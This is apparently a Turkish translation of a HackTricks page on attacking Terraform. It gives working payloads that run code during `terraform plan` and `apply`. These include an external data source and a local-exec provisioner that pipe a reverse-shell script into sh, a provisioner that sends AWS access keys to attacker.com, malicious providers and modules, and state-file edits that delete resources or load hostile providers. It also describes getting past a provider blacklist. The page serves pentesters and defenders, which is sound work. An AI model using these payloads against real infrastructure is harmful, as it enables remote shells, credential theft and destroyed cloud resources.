# Terraform Güvenliği

<details>

{% hint style="success" %}
AWS Hacking öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin**.
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Temel Bilgiler

[Belgelerden alıntı:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform, insan tarafından okunabilir yapılandırma dosyalarında **bulut ve yerinde kaynakları tanımlamanıza** olanak tanıyan bir **altyapı kodu aracıdır**. Bu dosyaları sürümleyebilir, yeniden kullanabilir ve paylaşabilirsiniz. Ardından, altyapınızın tüm yaşam döngüsü boyunca tutarlı bir iş akışını kullanarak altyapınızı sağlamlaştırabilir ve yönetebilirsiniz. Terraform, hesaplama, depolama ve ağ kaynakları gibi düşük seviyeli bileşenleri yönetebilirken, DNS girişleri ve SaaS özellikleri gibi yüksek seviyeli bileşenleri de yönetebilir.

### Terraform Nasıl Çalışır?

Terraform, bulut platformlarında ve diğer hizmetlerde kaynakları oluşturur ve yönetirken uygulama programlama arayüzleri (API'ler) aracılığıyla çalışır. Sağlayıcılar, Terraform'un erişilebilir bir API ile neredeyse her platform veya hizmetle çalışmasını sağlar.

![](<../.gitbook/assets/image (177).png>)

HashiCorp ve Terraform topluluğu, **1700'den fazla sağlayıcı** yazmıştır ve binlerce farklı türde kaynağı ve hizmeti yönetmek için bu sayı devam etmektedir. Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog ve daha birçok sağlayıcıyı içeren tüm genel olarak kullanılabilir sağlayıcıları [Terraform Registry](https://registry.terraform.io/) üzerinde bulabilirsiniz.

Temel Terraform iş akışı üç aşamadan oluşur:

* **Yazma:** Kaynakları tanımlarsınız, bu kaynaklar birden fazla bulut sağlayıcı ve hizmette olabilir. Örneğin, bir uygulamayı sanal makinelerde bir Sanal Özel Ağ (VPC) ağındaki güvenlik grupları ve bir yük dengeleyici ile dağıtmak için bir yapılandırma oluşturabilirsiniz.
* **Planlama:** Terraform, mevcut altyapı ve yapılandırmanıza dayanarak oluşturacağı, güncelleyeceği veya sileceği altyapıyı tanımlayan bir yürütme planı oluşturur.
* **Uygulama:** Onaylandığında, Terraform önerilen işlemleri doğru sırayla gerçekleştirir ve herhangi bir kaynak bağımlılığını dikkate alır. Örneğin, bir VPC'nin özelliklerini güncellerseniz ve o VPC'deki sanal makinelerin sayısını değiştirirseniz, Terraform önce VPC'yi yeniden oluşturacak ve ardından sanal makineleri ölçeklendirecektir.

![](<../.gitbook/assets/image (215).png>)

## Terraform Laboratuvarı

Sadece bilgisayarınıza terraform yükleyin.

İşte bir [kılavuz](https://learn.hashicorp.com/tutorials/terraform/install-cli) ve burada [terraform'ı indirmenin en iyi yolu](https://www.terraform.io/downloads).

## Terraform'da Uzaktan Kod Çalıştırma (RCE)

Terraform, **bir web sayfası veya ağ hizmeti sunan bir platforma sahip değil**, bu nedenle terraform'u **tehlikeye atmanın tek yolu**, **terraform yapılandırma dosyalarını ekleyebilmek/değiştirebilmektir**.

Ancak, terraform, **farklı konumlara ayrıcalıklı erişim** sağlayacak şekilde çalışabilmesi için **çok hassas bir bileşendir**.

Bir saldırganın terraform'un çalıştığı sistemdeki sistemi tehlikeye atabilmesi için **terraform yapılandırmalarını depolayan depoyu tehlikeye atması gerekmektedir**, çünkü bir noktada bunlar **yorumlanacak**.

Aslında, **bir PR oluşturulduktan sonra terraform plan/apply'ı otomatik olarak yürüten** Atlantis gibi çözümler bulunmaktadır:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Bir terraform dosyasını tehlikeye atabilirseniz, birisi `terraform plan` veya `terraform apply` komutunu çalıştırdığında farklı yollarla RCE gerçekleştirebilirsiniz.

### Terraform plan

Terraform plan, terraform'da **en çok kullanılan komuttur** ve geliştiriciler/terraform kullanan çözümler bunu sürekli çağırır, bu nedenle **RCE almanın en kolay yolu**, bir `terraform plan` sırasında keyfi komutları çalıştıran bir terraform yapılandırma dosyasını zehirlemektir.

#### Harici bir sağlayıcı kullanarak

Terraform, Terraform ve harici programlar arasında bir arayüz sağlayan [`external` sağlayıcıyı](https://registry.terraform.io/providers/hashicorp/external/latest/docs) sunar. `external` veri kaynağını kullanarak bir `plan` sırasında keyfi kod çalıştırabilirsiniz.

Terraform yapılandırma dosyasına aşağıdakine benzer bir şey enjekte etmek, `terraform plan` çalıştırıldığında bir ters shell çalıştıracaktır:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Özel bir sağlayıcı kullanma

Bir saldırgan, bir [özel sağlayıcıyı](https://learn.hashicorp.com/tutorials/terraform/provider-setup) [Terraform Registry](https://registry.terraform.io/)'e gönderebilir ve daha sonra bunu bir özellik dalında Terraform koduna ekleyebilir ([buradan örnek](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Sağlayıcı `init`te indirilir ve `plan` çalıştırıldığında kötü amaçlı kodu çalıştıracaktır.

Örneği [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) adresinde bulabilirsiniz.

#### Harici bir referans kullanma

Bahsedilen her iki seçenek de faydalıdır ancak çok gizli değildir (ikincisi birinci seçeneğe göre daha gizli ancak daha karmaşıktır). Bu saldırıyı, bu önerileri takip ederek hatta daha **gizli bir şekilde** gerçekleştirebilirsiniz:

* Terraform dosyasına doğrudan ters kabuk eklemek yerine, ters kabuğu içeren **harici bir kaynağı yükleyebilirsiniz**:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Rev shell kodunu [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) adresinde bulabilirsiniz.

* Dış kaynağı kullanırken, **ref** özelliğini kullanarak **repo içinde bir dalda terraform rev shell kodunu gizlemek** için şöyle bir şey yapabilirsiniz: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Tüm değişiklikleri uygulamak için Terraform apply çalıştırılacak, ayrıca **yerel yürütme** ile RCE elde etmek için kötü niyetli bir Terraform dosyası enjekte edebilirsiniz.\
Sadece aşağıdaki gibi bir payload'ın `main.tf` dosyasında sona erdiğinden emin olmanız gerekmektedir:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
## Sırların Sızdırılması

`terraform apply` komutunu çalıştırarak **terraform tarafından kullanılan gizli değerlerin sızdırılmasını** sağlamak için terraform dosyasına şöyle bir şey ekleyebilirsiniz:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform Durum Dosyalarını Kötüye Kullanma

Eğer terraform durum dosyaları üzerinde yazma erişiminiz varsa ancak terraform kodunu değiştiremiyorsanız, [**bu araştırma**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) dosyadan faydalanmanın bazı ilginç seçeneklerini sunar:

### Kaynakları Silme <a href="#deleting-resources" id="deleting-resources"></a>

Kaynakları yok etmek için 2 yol vardır:

1. **Durum dosyasına gerçek kaynağı yok etmek için rastgele bir isimle kaynak ekleyin**

Çünkü terraform, kaynağın var olmaması gerektiğini görecek ve onu yok edecektir (belirtilen gerçek kaynak kimliğini takip ederek). Önceki sayfadaki örnek:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Kaynağı silmek için değiştirin, güncellenemeyecek şekilde (böylece silinecek ve yeniden oluşturulacak)**

Bir EC2 örneği için, örneğin türünü değiştirmek, terraform'un onu silip yeniden oluşturmasını sağlamak için yeterlidir.

### Uzaktan Kod Çalıştırma (RCE)

Ayrıca, [özel bir sağlayıcı oluşturmak](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) ve terraform durum dosyasındaki sağlayıcılardan birini kötü niyetli olanla değiştirmek veya kötü niyetli sağlayıcıyla boş bir kaynak eklemek de mümkündür. Özgün araştırmadan bir örnek:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## Kara listeye alınmış sağlayıcıyı değiştirin

Eğer `hashicorp/external` durumunda kara listeye alındıysa, aşağıdakileri yaparak `external` sağlayıcısını yeniden uygulayabilirsiniz. Not: https://registry.terraform.io/providers/nazarewk/external/latest adresinde yayınlanan dış sağlayıcının bir çatalını kullanıyoruz. Kendi çatalınızı yayınlayabilir veya yeniden uygulayabilirsiniz.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Sonra normal olarak `external`'ı kullanabilirsiniz.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Denetim Araçları

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec, terraform kodunuzu statik analiz ederek potansiyel yanlış yapılandırmaları tespit etmek için kullanır.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan, Altyapı olarak Kod için bir statik kod analizcisi.

## Referanslar

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
